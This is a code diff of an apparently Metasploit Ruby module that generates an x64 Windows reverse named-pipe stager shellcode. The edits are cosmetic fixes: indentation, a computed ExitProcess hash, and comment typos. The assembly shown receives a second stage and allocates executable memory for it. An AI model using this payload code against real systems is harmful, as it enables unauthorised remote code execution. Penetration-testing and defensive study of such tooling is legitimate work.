@@ -59,8 +59,8 @@ module Payload::Windows::ReverseNamedPipe_x64
       and rsp, ~0xF           ;  Ensure RSP is 16 byte aligned
       call start              ; Call start, this pushes the address of 'api_call' onto the stack.
       #{asm_block_api}
-      start:
-        pop rbp               ; block API pointer
+     start:
+      pop rbp                 ; block API pointer
       #{asm_reverse_named_pipe(opts)}
     ^
     Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
@@ -145,13 +145,13 @@ module Payload::Windows::ReverseNamedPipe_x64
     else
       asm << %Q^
       failure:
-        push 0x56A2B5F0         ; hardcoded to exitprocess for size
+        push #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
         call rbp
       ^
     end
 
     asm << %Q^
-      ; this  lable is required so that reconnect attempts include
+      ; this label is required so that reconnect attempts include
       ; the UUID stuff if required.
       connected:
         xchg rdi, rax           ; Save the file handler for later
@@ -197,7 +197,7 @@ module Payload::Windows::ReverseNamedPipe_x64
         pop r9                  ; PAGE_EXECUTE_READWRITE
         push 0x1000             ;
         pop r8                  ; MEM_COMMIT
-        mov rdx, rsi            ; the newly recieved second stage length.
+        mov rdx, rsi            ; the newly received second stage length.
         xor rcx, rcx            ; NULL as we dont care where the allocation is.
         mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call rbp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
